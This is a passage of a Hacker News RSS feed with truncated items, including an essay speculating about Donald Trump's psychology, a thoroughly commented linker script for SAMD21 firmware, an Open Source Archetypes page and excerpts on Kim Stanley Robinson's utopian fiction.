</p><p>I was a subject of a pop diagnosis too. My own odd behavior was at times explained by my colleagues as a result of growing up without a father. I disagree: I had a dad and two moms (with my older siblings playing the roles). I was also a subject of a wild hypothesis that my <a href="https://supermemo.guru/wiki/Can_incremental_reading_cause_brain_damage%3F" title="Can incremental reading cause brain damage?">brain may have been injured</a> by decades of <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>. That diagnosis makes me grin and giggle. The childish side of my personality makes me enjoy that kind of anxious theory. Most importantly, such a misdiagnosis is a fantastic ground for inspiration and further analysis.
</p><p>I see nothing wrong with hypothesizing, esp. when it is done in a casual blog with all caveats listed. I stand for <a href="https://supermemo.guru/wiki/On_freedom_of_education_and_freedom_of_information" title="On freedom of education and freedom of information">free speech</a>, and I love inspiration.
</p><p>Some of my words in this text might be a bit offensive to president Trump, and I hate to offend. However, so many bad things have been said about the president, that my text may actually be taken as preponderantly complimentary.
</p>
<h3><span id="Trump.27s_brain_is_good">Trump's brain is good</span></h3>
<p>Opponents may hate to admit it, but Trump's brain is strong and his success is attributable to his brain properties.
</p><p>Most of the criticism of Trump's brain comes from the fact that we have set up a set of standards that we believe world leaders should live up to. They range from moral standards to <a href="https://www.theringer.com/tech/2017/8/30/16224184/president-trump-twitter-spelling">spelling</a>. In psychiatry, we should always divide abnormal behavior into two categories: (1) <b>deviant</b> and (2) <b>maladaptive</b>. In addition, we need to separate (1) cognitive <b>tradeoff</b> from (2) cognitive <b>pathology</b>.
</p><p>Trump meets all the criteria of the <a href="https://en.wikipedia.org/wiki/Narcissistic_personality_disorder">narcissistic personality disorder</a> except for one key factor: his narcissism does not lead to a significant impairment in functioning (in the light of his own goals). Just the opposite. Trump can use his bombast to his advantage. It might be a classic compensation via training. All healthy brains are capable of an excellent adaptation to the environment. Trump's brain has adapted to compensate for a great deal of bullets taken straight from <a href="https://en.wikipedia.org/wiki/DSM-5">DSM-5</a>.
</p><p>Trump is highly deviant, but his adaptation is excellent. He won the presidency. If an individual with a set of maladaptive traits could achieve that, we should fear for the future of democracy. Trump is also high on cognitive tradeoffs: he is strong at spotting patterns, and this characteristic always comes with a high disregard for detail. This is a typical cognitive tradeoff.
</p><p>In summary, Trump's brain is strong. A strong brain does not prevent one from being a freak.
</p>
<h3><span id="Mental_health_evaluation_requirement">Mental health evaluation requirement</span></h3>
<p>47% of Americans believe Trump is unbalanced (source: Public Policy Polling, 865 registered …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain">https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain</a></em></p>]]>
            </description>
            <link>https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain</link>
            <guid isPermaLink="false">hacker-news-small-sites-25772198</guid>
            <pubDate>Thu, 14 Jan 2021 04:52:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The most thoroughly commented linker script (probably)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771834">thread link</a>) | @todsacerdoti
<br/>
January 13, 2021 | https://blog.thea.codes/the-most-thoroughly-commented-linker-script/ | <a href="https://web.archive.org/web/*/https://blog.thea.codes/the-most-thoroughly-commented-linker-script/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>While developing the firmware for Winterbloom's <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux">Castor &amp; Pollux</a>, I got very curious as to just what the Microchip/Atmel-provided linker script was doing.</p>
<p>If you've never heard of or seen a linker script before you're not alone. Most of us never even have to think about them, however, on memory constained embedded devices it's not uncommon to need to modify the default linker script.</p>
<p>The linker script controls how <code>ld</code> combines all of your <code>.o</code> files into a single <code>.elf</code> and how that resulting <code>.elf</code> file gets loaded by the target processor.</p>
<p>So I was staring at this script that made absolutely no sense to me. It's filled with incantations and mysterious symbols and there's no indication of what they're for or where they come from.</p>
<p>So I did a <strong>lot</strong> of research and now I can present to you <strong>the most thoroughly commented linker script</strong><sup id="fnref:probably"><a href="#fn:probably">1</a></sup>.</p>
<p>You can see this script in its entirety, comments and all, on <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/blob/master/firmware/scripts/samd21g18a.ld">GitHub</a>. But if you'd like to read it here instead it's transcribed below.</p>
<h2 id="output-format">Output format</h2>
<p>Output format sets the ELF output format to use a specific BFD backend.</p>
<p>The first is the default BFD. The second and third arguments are used
when big (-EB) or little (-EL) endian is requested.</p>
<p>Since the SAM D series are configured with only little endian support,
"elf32-littlearm" is used across the board. This option seems to be
included by Atmel/Microchip out of an abundance of caution, as
arm-none-eabi-ld will do the right thing and use "elf32-littlearm" by
default.</p>
<p>The list of acceptable values can be obtained using <code>objdump -i</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/Format-Commands.html#Format-Commands">https://sourceware.org/binutils/docs/ld/Format-Commands.html#Format-Commands</a></li>
<li><a href="https://sourceware.org/binutils/docs/ld/BFD.html">https://sourceware.org/binutils/docs/ld/BFD.html</a></li>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 11.1.11, Cortex M0+ Configuration</li>
</ul>
<pre><span>OUTPUT_FORMAT</span><span>(</span><span>"elf32-littlearm"</span><span>,</span> <span>"elf32-littlearm"</span><span>,</span> <span>"elf32-littlearm"</span><span>)</span>
</pre>
<h2 id="cpu-memory-configuration-variables">CPU memory configuration variables</h2>
<p>These variables are used by the following "MEMORY" command to define
the various memory spaces.</p>
<p>For the SAMD21G18A used by this project, the available Flash is
262kB and the available SRAM is 32kB.</p>
<p>This project also reserves 8kB for the bootloader and 1kB for
"non-volatile memory" (NVM) - which is used by the application
to store calibration and user settings.</p>
<p>References:</p>
<ul>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 10.2, Physical Memory Map</li>
</ul>
<pre><span>FLASH_SIZE</span> <span>=</span> <span>0x40000</span><span>;</span>      <span>/* 256kB */</span>
<span>BOOTLOADER_SIZE</span> <span>=</span> <span>0x2000</span><span>;</span>  <span>/* 8kB */</span>
<span>NVM_SIZE</span> <span>=</span> <span>0x400</span><span>;</span>          <span>/* 1kbB */</span>
<span>SRAM_SIZE</span> <span>=</span> <span>0x8000</span><span>;</span>        <span>/* 32kB */</span>
</pre>
<p>ARM Cortex-M processors use a descending stack and generally
require stack space to be set aside in RAM.</p>
<p>The application's behavior determines just how much stack space
should be reserved. I generally start with 2kB (0x800) of
stack space for Cortex-M0+ projects programmed in C .</p>
<p>You can analyze stack usage in GCC using the <code>-fstack-usage</code>
flag and you can enable compiler warnings for stack usage
with <code>-Wstack-usage=STACK_SIZE</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://embeddedartistry.com/blog/2020/08/17/three-gcc-flags-for-analyzing-memory-usage/">https://embeddedartistry.com/blog/2020/08/17/three-gcc-flags-for-analyzing-memory-usage/</a></li>
<li><a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/how-much-stack-memory-do-i-need-for-my-arm-cortex--m-applications">https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/how-much-stack-memory-do-i-need-for-my-arm-cortex--m-applications</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gnat_ugn/Static-Stack-Usage-Analysis.html">https://gcc.gnu.org/onlinedocs/gnat_ugn/Static-Stack-Usage-Analysis.html</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html">https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html</a></li>
</ul>
<pre><span>STACK_SIZE</span> <span>=</span> <span>DEFINED</span><span>(</span><span>__stack_size__</span><span>)</span> <span>?</span> <span>__stack_size__</span> <span>:</span> <span>0x800</span><span>;</span>
</pre>
<h2 id="memory-space-definition">Memory space definition</h2>
<p>This section declare blocks of memories for specific purposes. Since an
ARM's address space is generally split between Flash, SRAM, peripherals,
and other regions, it's necessary to tell the linker where different
types of data can go in the address space.</p>
<p>These blocks will be used in the <code>SECTIONS</code> command below.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/MEMORY.html#MEMORY">https://sourceware.org/binutils/docs/ld/MEMORY.html#MEMORY</a></li>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 10.2, Physical Memory Map</li>
</ul>
<pre><span>MEMORY</span>
<span>{</span>
</pre>
<p>Start with the Flash memory region. On the SAMD21, Flash starts at
the beginning of the address space (<code>0x00000000</code>) and is contiguous
right up to the size of the Flash. Flash is marked a <code>rx</code> so
that the linker knows that this space is read-only (<code>r</code>) and
executable (<code>x</code>).</p>
<p>The "bootloader" section allows this firmware to work with the uf2
bootloader. The bootloader takes the first 0x2000 bytes of flash
memory.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/adafruit/uf2-samdx1#configuration">https://github.com/adafruit/uf2-samdx1#configuration</a></li>
</ul>
<pre>    <span>bootloader</span> <span>(</span><span>rx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x00000000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>BOOTLOADER_SIZE</span>
</pre>
<p>Following the bootloader is the flash memory used by the application,
called "rom" here - even though it's flash, the name is just a name
and doesn't carry special meaning.</p>
<p>The total length of the rom block is the MCU's flash size minus the
bootloader's size and any space reserved for "non-volatile memory"
by the application.</p>
<pre>   <span>rom</span> <span>(</span><span>rx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x00002000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>FLASH_SIZE</span> <span>-</span> <span>BOOTLOADER_SIZE</span> <span>-</span> <span>NVM_SIZE</span>
</pre>
<p>The "nvm" block is space set aside for the application to store
user settings and calibration data in the MCU's flash.</p>
<p>The block is located right at the end of the flash space. This
is useful because it means that it says in a fixed location
regardless of how much flash space the application takes up
in "rom". Explicitly defining this section also lets the
linker ensure that application code doesn't overwrite the
data in this region.</p>
<p>This block is marked as read-only (<code>r</code>) because flash can not
be written in the same way as normal memory, however, the
application can use the SAMD's NVM peripheral to write data in
this region.</p>
<pre>   <span>nvm</span> <span>(</span><span>r</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>FLASH_SIZE</span> <span>-</span> <span>NVM_SIZE</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>NVM_SIZE</span>
</pre>
<p>The "ram" block is mapped to the CPU's SRAM and it's where
the stack, heap, and all variables will go.</p>
<p>For the SAMD21, SRAM starts at 0x20000000 and is contiguous
for the size of the SRAM.</p>
<pre>   <span>ram</span> <span>(</span><span>rwx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x20000000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>SRAM_SIZE</span>
<span>}</span>
</pre>
<h2 id="sections">Sections</h2>
<p>The sections command tells the linker how to combine the
input files into an output ELF and where segments belong
in memory.</p>
<p>The linker takes a set of input files containing the "input
sections" and uses this to map them to "output sections"
which are placed in the output ELF file.</p>
<p>While the most important sections to think about here
are the ones that'll be placed into the memory (segments)
some sections are just placed in the output ELF for debugging.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/SECTIONS.html#SECTIONS">https://sourceware.org/binutils/docs/ld/SECTIONS.html#SECTIONS</a></li>
</ul>
<pre><span>SECTIONS</span>
<span>{</span>
</pre>
<p>The text segment contains program code and read-only data.</p>
<p>References:</p>
<ul>
<li><a href="https://developer.arm.com/documentation/dui0101/a/">https://developer.arm.com/documentation/dui0101/a/</a>
Page 5, Segments</li>
<li><a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections">http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections</a></li>
</ul>
<pre>   <span>.</span><span>text</span> <span>:</span>
   <span>{</span>
</pre>
<p>This segment must be 4-byte aligned as defined in ARM ELF
File Format specification.</p>
<pre>      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
</pre>
<p>The vector table defines the initial stack pointer and
interrupt/exception routines for the ARM CPU and device
peripherals. Every Cortex-M project needs this.</p>
<p>For the SAM D series the vector table is expected
to be at address 0x00000000 after reset. Since
flash memory starts at 0x00000000, the first values
in flash should be the vector table.</p>
<p>When defining the vector table in code you must use
<code>__attribute__ ((section(".vectors")))</code> to tell
GCC to place the vector table into the section
named ".vectors" in the input object file so that
the linker can find it.</p>
<p>Note that since this project uses the UF2 bootloader,
this actually gets placed at the beginning of the
program's flash area (0x2000). The Cortex-M allows
changing the vector table after initialization,
so the startup script sets the Vector Table Offset
Register (<code>SCB-&gt;VTOR</code>) to <code>_sfixed</code> during its
intialization. The <code>_efixed</code> symbol is unused but
included for completeness.</p>
<p>References:</p>
<ul>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
Secion 8.3.3, Fetching of Initial Instructions</li>
<li><a href="https://static.docs.arm.com/ddi0403/eb/DDI0403E_B_armv7m_arm.pdf">https://static.docs.arm.com/ddi0403/eb/DDI0403E_B_armv7m_arm.pdf</a>
Section B1.5.3, The vector table
Section B3.2.5, Vector Table Offset Register, VTOR</li>
<li><a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/tree/master/firmware/third_party/samd21/gcc/gcc/startup_samd21.c">startup_samd21.c</a></li>
</ul>
<pre>      <span>_sfixed</span> <span>=</span> <span>.;</span>
      <span>KEEP</span><span>(</span><span>*</span><span>(.</span><span>vectors</span> <span>.</span><span>vectors</span><span>.</span><span>*</span><span>))</span>
</pre>
<p>Include code and read-only data sections from all
input files.</p>
<p>By default, GCC places all program code into a section named
".text" and read-only data (such as const static variables) into
a section named ".rodata" in the input object files. This naming
convention is from the ELF ABI specification.</p>
<p>GCC generates three "flavors" of sections in object files:</p>
<ul>
<li><code>.{section}</code>: the basic section.</li>
<li><code>.{section}.*</code>: sections generated by <code>-ffunction-sections</code> and
<code>-fdata-sections</code> so that each function/data has a unique
section.</li>
<li><code>.gnu.linkonce.{type}.*</code>: sections generated by GCC so the
linker can remove duplicates. Seems to be related to
Vague Linking.</li>
</ul>
<p>References:</p>
<ul>
<li><a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections">http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Vague-Linkage.html">https://gcc.gnu.org/onlinedocs/gcc/Vague-Linkage.html</a></li>
<li><a href="https://stackoverflow.com/questions/5518083/what-is-a-linkonce-section">https://stackoverflow.com/questions/5518083/what-is-a-linkonce-section</a></li>
</ul>
<pre>      <span>*</span><span>(.</span><span>text</span> <span>.</span><span>text</span><span>.</span><span>*</span> <span>.</span><span>gnu</span><span>.</span><span>linkonce</span><span>.</span><span>t</span><span>.</span><span>*</span><span>)</span>
      <span>*</span><span>(.</span><span>rodata</span> <span>.</span><span>rodata</span><span>*</span> <span>.</span><span>gnu</span><span>.</span><span>linkonce</span><span>.</span><span>r</span><span>.</span><span>*</span><span>)</span>
</pre>
<h2 id="c-c-runtime-support">C &amp; C++ runtime support</h2>
<p>The following sections are for the C/C++ runtime. These are generally used by crt0.</p>
<p>References:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Crt0">https://en.wikipedia.org/wiki/Crt0</a></li>
</ul>
<h3 id="initializers">Initializers</h3>
<ul>
<li>C++ Runtime: initializers for static variables.</li>
<li>C Runtime: designated constructors</li>
</ul>
<p>For C++, handles variables at file scope like this:</p>
<pre><span>int</span> <span>f</span> <span>=</span> <span>some_func</span><span>()</span>
</pre>
<p>For C, handles functions designated as constructors:</p>
<pre><code>void intialize_thing(void) __attribute__((constructor));
</code></pre>
<p>Executed by the C runtime at startup via <code>__libc_init_array</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/gcc-mirror/gcc/blob/master/libgcc/crtstuff.c">https://github.com/gcc-mirror/gcc/blob/master/libgcc/crtstuff.c</a></li>
<li><a href="https://sourceware.org/git/?p=newlib-cygwin.git;a=blob;f=newlib/libc/misc/init.c">https://sourceware.org/git/?p=newlib-cygwin.git;a=blob;f=newlib/libc/misc/init.c</a>;</li>
<li><a href="https://gcc.gnu.org/onlinedocs/gccint/Initialization.html">https://gcc.gnu.org/onlinedocs/gccint/Initialization.html</a></li>
<li><a href="https://developer.arm.com/documentation/dui0475/h/the-arm-c-and-c---libraries/c---initialization--construction-and-destruction">https://developer.arm.com/documentation/dui0475/h/the-arm-c-and-c---libraries/c---initialization--construction-and-destruction</a></li>
<li><a href="https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array">https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array</a></li>
</ul>
<pre>      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
      <span>KEEP</span><span>(</span><span>*</span><span>(.</span><span>init</span><span>))</span>
      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
  …</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thea.codes/the-most-thoroughly-commented-linker-script/">https://blog.thea.codes/the-most-thoroughly-commented-linker-script/</a></em></p>]]>
            </description>
            <link>https://blog.thea.codes/the-most-thoroughly-commented-linker-script/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771834</guid>
            <pubDate>Thu, 14 Jan 2021 04:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Family Moves from Shed to Apartment, Thanks to 8 Year Old's Plant Business]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25771412">thread link</a>) | @danhodgins
<br/>
January 13, 2021 | http://thesassyplant.com/16-family-moves-from-shed-to-apartment-thanks-to-8-year-olds-plant-business | <a href="https://web.archive.org/web/*/http://thesassyplant.com/16-family-moves-from-shed-to-apartment-thanks-to-8-year-olds-plant-business">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://thesassyplant.com/16-family-moves-from-shed-to-apartment-thanks-to-8-year-olds-plant-business</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771412</guid>
            <pubDate>Thu, 14 Jan 2021 03:15:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[John Carmack Essays]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771365">thread link</a>) | @tosh
<br/>
January 13, 2021 | https://waitwho.is/john-carmack/essays | <a href="https://web.archive.org/web/*/https://waitwho.is/john-carmack/essays">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><nav><div><p><a>Sign In</a><a href="https://waitwho.is/signup">Sign Up</a></p></div></nav><header><div><div><div><div><div><picture><source srcset="https://ucarecdn.com/13adf647-5c7e-4f4b-8750-a41a975591c5/-/resize/x550/-/format/webp/" type="image/webp"><img src="https://ucarecdn.com/13adf647-5c7e-4f4b-8750-a41a975591c5/-/resize/x550/-/format/auto/" alt="john-carmack cartoon"></picture></div></div></div><div><div><div><picture><source srcset="https://ucarecdn.com/13adf647-5c7e-4f4b-8750-a41a975591c5/-/resize/x550/-/format/webp/" type="image/webp"><img src="https://ucarecdn.com/13adf647-5c7e-4f4b-8750-a41a975591c5/-/resize/x550/-/format/auto/" alt="john-carmack cartoon"></picture></div></div></div></div><div><div><div><p>John Carmack</p><div><div><div><p><span>Subscribe</span></p><p><span>Subscribe</span></p></div></div></div></div></div></div></div><p>John Carmack is a Consulting CTO at Facebook's Oculus. He was previously CTO at Oculus  before he stepped down.  Prior to Oculus, he co-founded the video game company Id Software which revolutionized the first-person shooter games Doom and Quake. Id Software was sold to ZeniMax in 2009.
</p></header></div></div>]]>
            </description>
            <link>https://waitwho.is/john-carmack/essays</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771365</guid>
            <pubDate>Thu, 14 Jan 2021 03:09:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open Source Archetypes: A Framework for Purposeful Open Source]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771196">thread link</a>) | @pabs3
<br/>
January 13, 2021 | https://opentechstrategies.com/archetypes | <a href="https://web.archive.org/web/*/https://opentechstrategies.com/archetypes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div id="top">
        <div>

          <center><h2>Open Source Archetypes:<br>A Framework For Purposeful Open Source</h2></center>

          <p>“Open source” means many things to many people.  Many kinds
          of projects get grouped under the label "open source", and
          they may operate in very different ways.  Sometimes it helps to think
          through how an effort’s open source approach matches its
          goals, resources, and environment.  Our
          <a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf">field guide to Open Source Archetypes</a> is designed to help
          with that thinking, by providing a common vocabulary to
          discuss open source in ways that take account of important
          differences.</p>

          <p>The guide describes and compares a number of project
          archetypes we have observed.  We prepared it in partnership
          with <a href="https://mozilla.org/">Mozilla</a>, and our
          organizations (as well
          as <a href="https://blog.jwf.io/2020/11/open-source-archetypes-unicef-open-source/">others</a>) have found it useful in deciding how to invest
          in open source endeavors.</p>

          <center><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf"><img src="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2-cover.png" alt="Cover of Open Source Archetypes v2 report."></a></center>

          <!-- Search for "vh_height" in xsl/ots.xsl. -->

          <p>We hope it is useful to you as you design open source
          initiatives, weigh tradeoffs in strategy, and pick metrics to
          track success. The archetypes we list are useful comparison
          points for anybody trying to maximize the benefits of their
          open source investment.</p>

          <center><iframe src="https://www.youtube.com/embed/Lo61OOi8_4Y?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true" width="525" height="296"></iframe></center>

          <!-- Search for "vh_height" in xsl/ots.xsl. -->

          <center><h2>Archetypes Described</h2></center>

          <center>
          <table>
            <tbody><tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.13"><img src="https://opentechstrategies.com/images/noun_Welcome_Arms_538753.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.13">Wide Open</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.10"><img src="https://opentechstrategies.com/images/noun_Rocket_780226.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.10">Rocket Ship to Mars</a></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.8"><img src="https://opentechstrategies.com/images/noun_b2b_1528321.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.8">B2B Open Source</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.15"><img src="https://opentechstrategies.com/images/noun_open_1280343.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.15">Specialty Library</a></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.9"><img src="https://opentechstrategies.com/images/noun_Technology_Infrastructure_1271137.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.9">Multi-Vendor Infra</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.14"><img src="https://opentechstrategies.com/images/noun_crowd_31671.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.14">Mass Market</a></td><td></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.17"><img src="https://opentechstrategies.com/images/noun_River_Confluence_6285_000000.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.17">Upstream Dependency</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.16"><img src="https://opentechstrategies.com/images/noun_Trust_Fall_26969.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.16">Trusted Vendor</a></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.12"><img src="https://opentechstrategies.com/images/noun_Digital_ecosystem_1637682.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.12">Controlled Ecosystem</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.18"><img src="https://opentechstrategies.com/images/noun_Bath_451748.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.18">Bathwater</a></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.11"><img src="https://opentechstrategies.com/images/noun_Shigarami_1927548.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.11">Single Maintainer Houseplant</a></td>
                   </tr>
            </tbody>
          </table>
          </center>

          <center><h2>Quick Reference</h2></center>

          <p>Page 27 of the report is a Quick Reference guide to the
             archetypes.  While we recommend reading the whole report,
             we make the quick-ref available as a separate PDF here for
             convenience:</p>

          <center><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2-quick-ref.pdf"><img src="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2-quick-ref.png" alt="Open Source Archetypes Quick Reference Guide (p. 27)"></a></center>

          <center><h2>Source</h2></center>

          <center><p>"Open Source Archetypes" is published under a
             <a href="https://creativecommons.org/licenses/by-sa/4.0/">CC-BY-SA</a> license and its LaTeX source is available
             <a href="https://github.com/opentechstrategies/open-source-archetypes">here</a>.</p></center>
        <!-- container -->
      </div>
      <!-- archetypes section -->
      <!-- footer section -->
      
    </div>
    <!-- main -->
    <!-- scripts -->
    <!--[if lt IE 9]>
  <script src="js/jquery.js"></script>
  <script src="css/bootstrap/js/bootstrap.js"></script>
  <script src="js/script.js"></script>
  <script src="js/target.js"></script>
  <script src="js/prefixfree.js"></script>
<![endif]-->
    
    
    
    
    
  

</div></div>]]>
            </description>
            <link>https://opentechstrategies.com/archetypes</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771196</guid>
            <pubDate>Thu, 14 Jan 2021 02:46:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Letters from a Utopian California (Part 1)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771117">thread link</a>) | @durakot
<br/>
January 13, 2021 | https://culture.io/letters-from-a-utopian-california-part-1 | <a href="https://web.archive.org/web/*/https://culture.io/letters-from-a-utopian-california-part-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>









<div>




<article id="3674">







<section id=""><div><p>Anyone versed in the utopian strain of contemporary science fiction needs no introduction to <a href="https://en.wikipedia.org/wiki/Kim_Stanley_Robinson" target="_blank" rel="noopener">Kim Stanley Robinson’s</a> work. No living author has spent as much of his oeuvre grappling with the idea, its implications, and its achievability.</p>
<p><em>Pacific Edge</em>, his third novel (published in 1990), predates the Mars series he’s best known for and introduces many of the themes that permeate his later work<em>.</em> A deceptively low-stakes story of infatuation and heartbreak set against the backdrop of small town civic life in Orange County circa 2065, it paints a quietly powerful portrait of a California recovering from the excesses of late capitalism, but (this being America) still negotiating a balance between commerce, community, and the land.</p>
<p>It has never been more relevant. Here are some choice excerpts. ☼</p>
</div>
    























</section>



<section id=""><div><h2><em>“Fucking Iain Banks died and Ursula died, and I’m like the last utopian.”<br>
<span><strong></strong></span></em></h2>
<p>From “<a href="https://www.wired.com/story/kim-stanley-robinson-red-moon/" target="_blank" rel="noopener">The Climate-Obsessed Sci-Fi Genius of Kim Stanley Robinson</a>“, Wired Magazine</p>
</div>
    























</section>







<section id=""><div><p>“For now, all is calm. White flakes falling. I write in a kind of pocket utopia, a little island of calm in a maddened world. Perhaps it will help make my future seem more plausible to me—perhaps, remembering Switzerland, it will even seem possible. But there’s no such thing as a pocket utopia.”</p>
<p>✳︎ ✳︎ ✳︎</p>
